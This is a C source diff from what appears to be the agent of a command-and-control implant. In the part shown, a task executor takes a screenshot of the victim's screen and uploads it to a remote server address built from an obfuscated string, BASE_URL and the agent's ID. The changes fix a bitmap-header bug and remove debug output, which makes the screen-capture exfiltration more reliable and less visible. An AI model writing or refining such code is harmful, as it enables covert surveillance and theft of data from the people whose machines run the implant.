@@ -1351,7 +1351,7 @@ FILE *screenshot(){
     bmfHdr.bfReserved1 = 0;
     bmfHdr.bfReserved2 = 0;
     bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
-    fwrite((LPSTR)&bmfHdr, 1, strlen((LPSTR)&bmfHdr), wfo);
+    fwrite((LPSTR)&bmfHdr, 1, sizeof(BITMAPFILEHEADER), wfo);
     fwrite((LPSTR)lpbi, 1, dwDIBSize, wfo);
     GlobalUnlock(hDib);
     GlobalFree(hDib);
@@ -1568,7 +1568,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       tsk->successful = 1;
     }
   }else if (!strcmp(tsk->type, cmd_strs[13])){ // Take a screenshot
-    char strs[][40] = {"[OBFS_ENC]Error taking screenshot!", "[OBFS_ENC]Error uploading screenshot!", "[OBFS_ENC]Screenshot captured: ", "[OBFS_ENC]screenshot-", "[OBFS_ENC]%s/agent/upload/%s/%s"};
+    char strs[][40] = {"[OBFS_ENC]Error taking screenshot!", "[OBFS_ENC]Error uploading screenshot!", "[OBFS_ENC]Screenshot captured!", "[OBFS_ENC]screenshot-", "[OBFS_ENC]%s/agent/upload/%s/%s"};
     FILE *fo = screenshot();
     if (!fo){
       buffer_strcpy(result_buff, obfs_decode(strs[0]));
@@ -1576,18 +1576,14 @@ DWORD WINAPI task_executor(LPVOID ptr)
     }
     size_t file_size = ftell(fo);
     rewind(fo);
-    printf("pos: %ld\n", ftell(fo));
     char *filename = malloc(50);
     snprintf(filename, 50, "%s%ld.bmp", obfs_decode(strs[3]), (unsigned long)time(NULL));
-    printf("Screenshot file: %s\n", filename);
     char *upload_url = malloc(1024);
     snprintf(upload_url, 1024, obfs_decode(strs[4]), BASE_URL, striker->uid, tsk->uid);
-    printf("Uploading screenshot to: %s\n", upload_url);
     if (upload_file(upload_url, filename, file_size, fo, result_buff)){
       buffer_strcpy(result_buff, obfs_decode(strs[1]));
     }else{
       buffer_strcpy(result_buff, obfs_decode(strs[2]));
-      append_buffer(result_buff, filename, strlen(filename));
       tsk->successful = 1;
     }
     free(upload_url);
